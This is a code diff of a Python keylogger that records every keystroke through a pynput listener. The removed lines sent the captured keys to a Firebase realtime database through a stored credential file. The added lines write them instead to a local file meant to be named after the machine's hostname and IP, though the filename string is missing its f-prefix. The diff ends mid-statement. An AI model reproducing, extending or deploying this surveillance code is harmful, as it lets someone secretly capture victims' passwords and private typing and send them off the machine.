@@ -1,10 +1,8 @@
 from pynput.keyboard import Key, Listener
-import firebase_admin
-from firebase_admin import credentials, db
+import socket
 
-cred = credentials.Certificate("D:\.win\kee.json")
-firebase_admin.initialize_app(cred, {'databaseURL': 'https://keyl-882a4-default-rtdb.firebaseio.com/'})
-the_keys = []
+hostname = socket.gethostname()
+local_ip = socket.gethostbyname(hostname)
 
 def functionPerKey(key):
     special_keys = {
@@ -39,25 +37,25 @@ def functionPerKey(key):
         Key.f10: "[F10]",
         Key.f11: "[F11]",
         Key.f12: "[F12]",
+        # Add more special keys as needed
     }
 
     if hasattr(key, 'char') and key.char is not None:
-        the_keys.append(key.char)
+        # Normal alphanumeric key
+        with open('{hostname}_{local_ip}.txt', 'a') as log:
+            log.write(key.char)
     elif key in special_keys:
-        the_keys.append(special_keys[key])
+        # Special keys
+        with open('{hostname}_{local_ip}.txt', 'a') as log:
+            log.write(special_keys[key])
     else:
-        the_keys.append(f"({key})")
-
-    storeKeysToFirebase(the_keys)
-
-def storeKeysToFirebase(keys):
-    ref = db.reference('/log1')
-    keys_str = ''.join(map(str, keys))
-    ref.push().set(keys_str)
+        # Other special characters
+        with open('{hostname}_{local_ip}.txt', 'a') as log:
+            log.write("(" + str(key) + ")")
 
 def onEachKeyRelease(key):
     if key == Key.esc:
-        the_listener.stop()
+        return False
 
 with Listener(
         on_press=functionPerKey,
